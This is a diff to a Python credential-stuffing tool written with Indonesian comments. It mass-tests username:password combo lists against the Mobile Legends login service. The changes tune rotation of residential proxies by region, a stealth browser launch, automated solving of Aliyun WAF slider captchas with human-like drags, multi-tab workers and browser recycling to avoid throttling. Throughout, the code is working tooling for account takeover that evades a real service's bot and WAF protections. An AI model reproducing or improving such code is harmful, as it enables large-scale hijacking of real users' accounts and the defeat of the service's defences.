@@ -815,7 +815,7 @@ def generate_combo(count: int) -> str:
 # ── DataImpulse Proxy & Region Rotation (checker.js 1:1) ─────────────────────
 # Urutan: region Asia-SEA dulu (paling stabil untuk MLBB), baru sisanya
 # Jangan masukkan negara yang selalu ERR_TUNNEL (AF, AX, AL, DZ, AD, AI, AO, dll)
-DATAIMPULSE_REGIONS = ['sg', 'jp', 'kr', 'ph', 'my', 'id', 'tw', 'th', 'hk']
+DATAIMPULSE_REGIONS = ['sg', 'my', 'id', 'jp', 'kr', 'hk', 'tw', 'th']
 # Negara yang terbukti ERR_TUNNEL → di-skip saat rotasi
 _TUNNEL_BLACKLIST = {
     'af','ax','al','dz','ad','ai','ao','aq','am','aw','az',
@@ -1222,7 +1222,7 @@ async def solve_waf(page, ctx) -> bool:
         return True
 
     box = None
-    for _ in range(25):  # ponytail: up to 5.0s for Aliyun nc.js to mount; rotate fast if stuck
+    for _ in range(40):  # ponytail: up to 8.0s for Aliyun nc.js + feilin bundle to mount over proxy
         box = await page.evaluate("""() => {
             const s = document.getElementById('aliyunCaptcha-sliding-slider')
                    || document.querySelector('.btn_slide')
@@ -1257,7 +1257,7 @@ async def solve_waf(page, ctx) -> bool:
     for variant_dist in dist_variants:
         await _human_drag(page, ctx, sx, sy, variant_dist)
         still = True
-        for _ in range(15):
+        for _ in range(10):
             await asyncio.sleep(0.1)
             still = await page.evaluate("""() => {
                 const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
@@ -1269,13 +1269,15 @@ async def solve_waf(page, ctx) -> bool:
                 break
         if not still:
             stats['waf_solved'] += 1
-            clear_line()
-            if not _TUI_ACTIVE: p_out(f"  {c(GREEN)}→ slider solved ✓{W}")
+            if not _TUI_ACTIVE:
+                clear_line()
+                p_out(f"  {c(GREEN)}→ slider solved ✓{W}")
             print_progress()
             return True
 
-    clear_line()
-    if not _TUI_ACTIVE: p_out(f"  {c(GOLD)}→ slider failed (still visible){W}")
+    if not _TUI_ACTIVE:
+        clear_line()
+        p_out(f"  {c(GOLD)}→ slider failed (still visible){W}")
     print_progress()
     return False
 
@@ -1290,42 +1292,50 @@ async def launch_browser_smart(headless=True, humanize=False):
         '--no-sandbox',
         '--mute-audio',
     ]
+    for _try in range(2):
+        try:
+            lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
+            # ponytail: keep CloakBrowser Pro native stealth intact while avoiding Playwright mouse-hook jitter on multi-worker touch drag
+            b = await asyncio.wait_for(
+                launch_async(headless=headless, humanize=humanize, license_key=lic_key or None),
+                timeout=20.0,
+            )
+            if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser Pro siap ✓{W}")
+            try:
+                _driver_pid = b._impl_obj._connection._transport._proc.pid
+            except Exception:
+                pass
+            return b
+        except Exception as e:
+            if 'session limit' in str(e).lower():
+                if _try == 0:
+                    dbg("CloakBrowser Pro session limit -> tunggu 10s sebelum retry...")
+                    await asyncio.sleep(10.0)
+                    continue
+                if not _TUI_ACTIVE:
+                    p_out(f"\n  {c(RED)}[!] CloakBrowser Pro: session limit reached!{W}")
+                    p_out(f"  {c(GOLD)}    Tunggu ~4 menit agar seat lama bebas, atau tutup sesi lain.{W}")
+                    p_out(f"  {c(GRAY)}    Fallback Chrome biasa sering diblokir 405 oleh Aliyun WAF.{W}\n")
+                if PROXY_ENABLED:
+                    raise RuntimeError("CloakBrowser Pro session limit reached (batalkan fallback non-stealth agar tidak boros proxy)")
+            else:
+                dbg(f"CloakBrowser launch note: {e} → beralih ke Chrome Playwright")
+            break
+    from playwright.async_api import async_playwright
+    pw = await async_playwright().start()
+    _pw_instance = pw
+    if headless:
+        c_args.append('--headless=new')
     try:
-        lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
-        # ponytail: keep CloakBrowser Pro native stealth intact while avoiding Playwright mouse-hook jitter on multi-worker touch drag
-        b = await asyncio.wait_for(
-            launch_async(headless=headless, humanize=humanize, license_key=lic_key or None),
-            timeout=20.0,
-        )
-        if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser Pro siap ✓{W}")
-        try:
-            _driver_pid = b._impl_obj._connection._transport._proc.pid
-        except Exception:
-            pass
-        return b
-    except Exception as e:
-        if 'session limit' in str(e).lower():
-            if not _TUI_ACTIVE:
-                p_out(f"\n  {c(RED)}[!] CloakBrowser Pro: session limit reached!{W}")
-                p_out(f"  {c(GOLD)}    Tunggu ~4 menit agar seat lama bebas, atau tutup sesi lain.{W}")
-                p_out(f"  {c(GRAY)}    Fallback Chrome biasa sering diblokir 405 oleh Aliyun WAF.{W}\n")
-        else:
-            dbg(f"CloakBrowser launch note: {e} → beralih ke Chrome Playwright")
-        from playwright.async_api import async_playwright
-        pw = await async_playwright().start()
-        _pw_instance = pw
-        if headless:
-            c_args.append('--headless=new')
-        try:
-            b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
-        except Exception:
-            b = await pw.chromium.launch(headless=headless, args=c_args)
-        if not _TUI_ACTIVE: p_out(f"{c(GOLD)}[*] Chrome Playwright fallback aktif (non-stealth){W}")
-        try:
-            _driver_pid = b._impl_obj._connection._transport._proc.pid
-        except Exception:
-            pass
-        return b
+        b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
+    except Exception:
+        b = await pw.chromium.launch(headless=headless, args=c_args)
+    if not _TUI_ACTIVE: p_out(f"{c(GOLD)}[*] Chrome Playwright fallback aktif (non-stealth){W}")
+    try:
+        _driver_pid = b._impl_obj._connection._transport._proc.pid
+    except Exception:
+        pass
+    return b
 
 # ── Fast Direct HTTP POST in Verified Browser Session ───────────────────────
 def build_login_payload(user: str, passw: str) -> dict:
@@ -1387,9 +1397,9 @@ async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[
         return "ERR", {"message": str(e)}
 
 # ── Core Browser Login via Manual Form Typing ────────────────────────────────
-async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -> tuple[str, dict]:
+async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, waf_lock: asyncio.Lock | None = None) -> tuple[str, dict]:
     """Submit form dan tangkap respons login menggunakan Direct Vue Bridge + Fallback Natural Typing."""
-    api_result = {"json": None, "raw": None, "had_waf": False}
+    api_result = {"json": None, "raw": None, "had_waf": False, "proxy_err": False}
     resp_event = asyncio.Event()
     captured_responses = []
 
@@ -1419,12 +1429,15 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
                 if resp.status == 405 or (not body_stripped.startswith('{') and ('aliyun' in body_low or 'waf' in body_low)):
                     api_result["had_waf"] = True
                     resp_event.set()
-                if body_stripped.startswith('{'):
+                elif body_stripped.startswith('{'):
                     j = json.loads(body_stripped)
                     captured_responses.append((resp.status, j))
                     if j.get('code') is not None:
                         api_result["json"] = j
                         resp_event.set()
+                elif resp.status == 429 or resp.status >= 500:
+                    api_result["proxy_err"] = True
+                    resp_event.set()
             except Exception:
                 pass
 
@@ -1517,11 +1530,13 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
             if btn: await btn.click()
             else: await page.keyboard.press('Enter')
 
-        # 3. Event-driven wait up to 12s (wakes immediately on fast JSON or 405 WAF)
+        # 3. Event-driven wait up to 12s (wakes immediately on fast JSON, 405 WAF, or HTTP 429/5xx)
         try:
             await asyncio.wait_for(resp_event.wait(), timeout=12.0)
         except asyncio.TimeoutError:
             pass
+        if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
+            return 'ERR', {'message': 'PROXY_HTTP_ERR'}
 
         drag_count = 0
         if not api_result["json"]:
@@ -1529,8 +1544,8 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
                 if api_result["had_waf"]:
                     try:
                         await page.wait_for_selector(
-                            '#aliyunCaptcha-sliding-slider, .btn_slide, #waf_nc_block',
-                            state='visible', timeout=2500
+                            '#aliyunCaptcha-sliding-slider, .btn_slide, [id*="sliding-slider"]',
+                            state='visible', timeout=4500
                         )
                     except Exception:
                         pass
@@ -1544,14 +1559,19 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
                     break
                 drag_count += 1
                 dbg(f"w{wid:02d} Aliyun slider ({user}), solving...")
-                if not await solve_waf(page, ctx):
+                if waf_lock is not None:
+                    async with waf_lock:
+                        ok_waf = await solve_waf(page, ctx)
+                else:
+                    ok_waf = await solve_waf(page, ctx)
+                if not ok_waf:
                     break
                 if api_result["json"]:
                     break
                 resp_event.clear()
                 api_result["had_waf"] = False
                 try:
-                    await asyncio.wait_for(resp_event.wait(), timeout=0.7)
+                    await asyncio.wait_for(resp_event.wait(), timeout=1.5)
                 except asyncio.TimeoutError:
                     pass
                 if not api_result["json"] and not api_result["had_waf"]:
@@ -1599,28 +1619,31 @@ async def _route_filter(route):
     """Abort heavy assets and serve static JS/CSS bundles from RAM cache (0 proxy quota on repeat contexts)."""
     r = route.request
     url = r.url
-    if r.resource_type in ("image", "media", "font") or any(d in url for d in ("google-analytics", "facebook", "doubleclick")):
-        return await route.abort()
-    path = url.split("?", 1)[0].lower()
-    if r.method == "GET" and path.endswith((".js", ".css")):
-        if not any(k in url.lower() for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "accountmtapi", "mpass", "moba5v5")):
-            if url in _STATIC_CACHE:
-                st, hdrs, body = _STATIC_CACHE[url]
-                return await route.fulfill(status=st, headers=hdrs, body=body)
-            try:
-                resp = await route.fetch()
-                body = await resp.body()
-                if resp.status == 200 and body and len(_STATIC_CACHE) < 128:
-                    _STATIC_CACHE[url] = (resp.status, dict(resp.headers), body)
-                return await route.fulfill(status=resp.status, headers=dict(resp.headers), body=body)
-            except Exception:
-                pass
-    return await route.continue_()
+    try:
+        if r.resource_type in ("image", "media", "font") or any(d in url for d in ("google-analytics", "facebook", "doubleclick")):
+            return await route.abort()
+        path = url.split("?", 1)[0].lower()
+        if r.method == "GET" and path.endswith((".js", ".css")):
+            if not any(k in url.lower() for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "accountmtapi", "mpass", "moba5v5")):
+                if url in _STATIC_CACHE:
+                    st, hdrs, body = _STATIC_CACHE[url]
+                    return await route.fulfill(status=st, headers=hdrs, body=body)
+                try:
+                    resp = await asyncio.wait_for(route.fetch(timeout=8000), timeout=9.0)
+                    body = await asyncio.wait_for(resp.body(), timeout=5.0)
+                    if resp.status == 200 and body and len(_STATIC_CACHE) < 128:
+                        _STATIC_CACHE[url] = (resp.status, dict(resp.headers), body)
+                    return await route.fulfill(status=resp.status, headers=dict(resp.headers), body=body)
+                except Exception:
+                    pass
+        return await route.continue_()
+    except Exception:
+        pass
 
 # ── Worker Task Loop with Proxy & WAF Isolation ─────────────────────────────
 async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                      browser, dm, base_proxy_info=None, proxy_pool=None,
-                     ensure_browser=None):
+                     ensure_browser=None, browser_state=None):
     """
     Desain baru: 1 slider → 1 sesi browser → tembak HTTP POST terus-menerus.
 
@@ -1645,21 +1668,43 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     rot_user_info    = None
     worker_epoch     = 0
     slider_cleared   = False
+    ctx_counted      = False
     _acct_retries    = {}
 
     async def _close_ctx():
-        nonlocal ctx, page, page2, slider_cleared
+        nonlocal ctx, page, page2, slider_cleared, ctx_counted
+        for p in (page2, page):
+            if p is None:
+                continue
+            for attr in ('_net_cdp', '_touch_cdp'):
+                cdp_s = getattr(p, attr, None)
+                if cdp_s is not None:
+                    try:
+                        await cdp_s.detach()
+                    except Exception:
+                        pass
+                    setattr(p, attr, None)
+            try:
+                await p.unroute_all(behavior='ignoreErrors')
+            except Exception:
+                pass
         if ctx:
             try:
-                await ctx.close()
+                await asyncio.wait_for(ctx.close(), timeout=5.0)
             except Exception:
                 pass
             ctx = page = page2 = None
             slider_cleared = False
+        if ctx_counted and browser_state is not None:
+            ctx_counted = False
+            browser_state['active'] = max(0, browser_state['active'] - 1)
+            if browser_state['active'] == 0:
+                browser_state['zero_evt'].set()
 
     async def _attach_page(p):
         try:
             cdp_net = await ctx.new_cdp_session(p)
+            p._net_cdp = cdp_net
             await cdp_net.send("Network.enable")
             _live_reqs = set()
             def _on_resp_rx(params):
@@ -1676,21 +1721,48 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         except Exception:
             pass
         await p.route(re.compile(r"\.(png|jpe?g|gif|webp|svg|woff2?|ttf|eot|ico|mp4|mp3|js|css)(\?|$)", re.I), _route_filter)
-        p.set_default_timeout(15000)
-        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=8000)
+        p.set_default_timeout(12000)
+        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=6000)
 
-    async def open_context_and_page(max_attempts: int = 8, rotate_ip: bool = False) -> bool:
+    async def open_context_and_page(max_attempts: int = 4, rotate_ip: bool = False) -> bool:
         """Buka context baru pada sticky proxy + navigasi ke login page."""
-        nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared
+        nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared, ctx_counted
         if rotate_ip:
             worker_epoch += 1
         await _close_ctx()
 
+        if browser_state is not None:
+            if not browser_state['gate'].is_set():
+                try:
+                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=25.0)
+                except Exception:
+                    pass
+            elif ensure_browser and not browser_state['recycling'] and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 180:
+                browser_state['recycling'] = True
+                browser_state['gate'].clear()
+                try:
+                    await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=18.0)
+                except Exception:
+                    pass
+                try:
+                    dbg("Periodic Chromium recycle (clean memory/speed reset)...")
+                    await ensure_browser(force_relaunch=True)
+                except Exception:
+                    pass
+                finally:
+                    browser_state['born_ctx'] = stats['proxy_ctx']
+                    browser_state['recycling'] = False
+                    browser_state['gate'].set()
+
         for attempt in range(1, max_attempts + 1):
+            if attempt > 1:
+                worker_epoch += 1
             if pool:
                 pool_idx = (pool_idx + 1) % len(pool)
                 cur_proxy_info = pool[pool_idx]
             try:
+                if browser_state is not None and not browser_state['gate'].is_set():
+                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=25.0)
                 b = await ensure_browser() if ensure_browser else browser
                 try:
                     if hasattr(b, 'is_connected') and not b.is_connected() and ensure_browser:
@@ -1716,7 +1788,11 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 elif cur_proxy_info:
                     ctx_opts['proxy'] = cur_proxy_info
 
-                ctx = await b.new_context(**ctx_opts)
+                ctx = await asyncio.wait_for(b.new_context(**ctx_opts), timeout=12.0)
+                if browser_state is not None:
+                    ctx_counted = True
+                    browser_state['active'] += 1
+                    browser_state['zero_evt'].clear()
                 stats['proxy_ctx'] += 1
                 page = await ctx.new_page()
                 await _attach_page(page)
@@ -1771,13 +1847,6 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             return False
 
         slider_cleared = True
-        # ponytail: Tab 2 opsional (--two-tab); default 1 tab/context agar bebas tab collision & 100% slider stabil
-        if TWO_TAB and page2 is None and ctx is not None:
-            try:
-                page2 = await ctx.new_page()
-                await _attach_page(page2)
-            except Exception:
-                page2 = None
         return True
 
     async def handle_result(kind: str, res_data: dict, user: str, passw: str, dec_d: dict):
@@ -1858,10 +1927,12 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         return
 
     ctx_cond = asyncio.Condition()
+    waf_lock = asyncio.Lock()
     ctx_gen = 0
     ctx_accts = 0
     inflight_tabs = 0
     recovering = False
+    tab0_done = False
     ACCOUNTS_PER_CTX = 80  # ponytail: keeps fast sticky contexts; prevents Aliyun throttle over long runs
 
     async def _recover_ctx(local_gen: int, reason: str):
@@ -1899,9 +1970,10 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 ctx_cond.notify_all()
 
     async def _tab_loop(tab_idx: int):
-        nonlocal page2, ctx_accts, inflight_tabs
+        nonlocal page2, ctx_accts, inflight_tabs, tab0_done
         p2_miss = 0
-        while True:
+        try:
+          while True:
             try:
                 u, pw = combo_q.get_nowait()
             except asyncio.QueueEmpty:
@@ -1930,8 +2002,11 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         continue
 
                     if p_tab is None:
-                        # Tab 1: never collide on Tab 0's `page`; recreate `page2` once ready or back off cleanly
+                        # Tab 1: wait for Tab 0 to earn 1st-login WAF cookie before launching Tab 2
                         if tab_idx == 1 and ctx is not None and slider_cleared:
+                            if ctx_accts < 1 and not tab0_done:
+                                await asyncio.sleep(0.3)
+                                continue
                             try:
                                 new_p2 = await ctx.new_page()
                                 await _attach_page(new_p2)
@@ -1952,7 +2027,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     p2_miss = 0
                     try:
-                        kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid)
+                        kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid, waf_lock=waf_lock)
                     except Exception as ex:
                         kind, res_data = 'ERR', {'message': str(ex)[:60]}
                     finally:
@@ -1972,7 +2047,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         combo_q.task_done()
                         done_item = True
                         print_progress()
-                        if ctx_accts >= ACCOUNTS_PER_CTX:
+                        if ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and browser_state['recycling']):
                             await _recover_ctx(my_gen, 'periodic_rotate')
                         break
 
@@ -1993,7 +2068,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     k_id = f"{u}:{pw}"
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
-                    if _acct_retries[k_id] > 3:
+                    if _acct_retries[k_id] > 4:
                         _acct_retries.pop(k_id, None)
                         stats['checked'] += 1
                         await handle_result('ERR', {'message': err_msg or f'{kind}_exhausted'}, u, pw, {})
@@ -2020,6 +2095,9 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         pass
                     combo_q.task_done()
                 raise
+        finally:
+          if tab_idx == 0:
+            tab0_done = True
 
     tab_tasks = [asyncio.create_task(_tab_loop(0))] + ([asyncio.create_task(_tab_loop(1))] if TWO_TAB else [])
     try:
@@ -2156,6 +2234,7 @@ async def async_main():
 
         workers_str = ask("Worker threads (1-30, rec 4-6)", "4")
         workers = max(1, min(30, int(workers_str) if workers_str.isdigit() else 5))
+        TWO_TAB = ask_yn("2-tab extra worker? (2 tab/context, lebih cepat)", default='y' if args.two_tab else 'n')
         HEADLESS = True  # ponytail: always headless
         DEBUG = False
         OUTPUT_DIR = os.path.join(BASE, "output")
@@ -2194,7 +2273,7 @@ async def async_main():
 
     _print_box("CONFIGURATION", [
         f" {c(WHITE)}Queue   :{W} {c(GREEN)}{len(queue):,} accounts{W} {c(GRAY)}(tot:{len(combos):,}, done:{len(done_accounts):,}){W}",
-        f" {c(WHITE)}Workers :{W} {c(CYAN)}{NUM_CONTEXTS} browser contexts (Headless){W}",
+        f" {c(WHITE)}Workers :{W} {c(CYAN)}{NUM_CONTEXTS} ctx x {2 if TWO_TAB else 1} tab ({NUM_CONTEXTS * (2 if TWO_TAB else 1)} streams){W}",
         f" {c(WHITE)}Proxy   :{W} {c(GOLD)}{shortpath(PROXY_FILE) if PROXY_ENABLED else 'Direct Mode'}{W}",
         f" {c(WHITE)}Output  :{W} {c(GRAY)}{shortpath(OUTPUT_DIR)}/{W}",
     ], bc=GRAY)
@@ -2225,6 +2304,9 @@ async def async_main():
     p_out(f"{c(CYAN)}[*] Menyiapkan engine browser...{W}")
     browser_ref = [None]
     browser_lock = asyncio.Lock()
+    browser_state = {'born_ctx': 0, 'active': 0, 'recycling': False, 'gate': asyncio.Event(), 'zero_evt': asyncio.Event()}
+    browser_state['gate'].set()
+    browser_state['zero_evt'].set()
     tasks = []
 
     async def ensure_browser(force_relaunch: bool = False):
@@ -2240,9 +2322,9 @@ async def async_main():
             if need:
                 if cur is not None:
                     try:
-                        await cur.close()
+                        await asyncio.wait_for(cur.close(), timeout=5.0)
                     except Exception:
-                        pass
+                        _emergency_cleanup()
                     browser_ref[0] = None
                     _driver_pid = None
                 if _pw_instance is not None:
@@ -2310,7 +2392,7 @@ async def async_main():
                     cur_b = await ensure_browser(force_relaunch=(fail_count >= 2))
                     await run_worker(
                         wid, queue, combo_q, cur_b, dm, p_info, live_pool,
-                        ensure_browser=ensure_browser,
+                        ensure_browser=ensure_browser, browser_state=browser_state,
                     )
                     if combo_q.empty():
                         break  # selesai normal
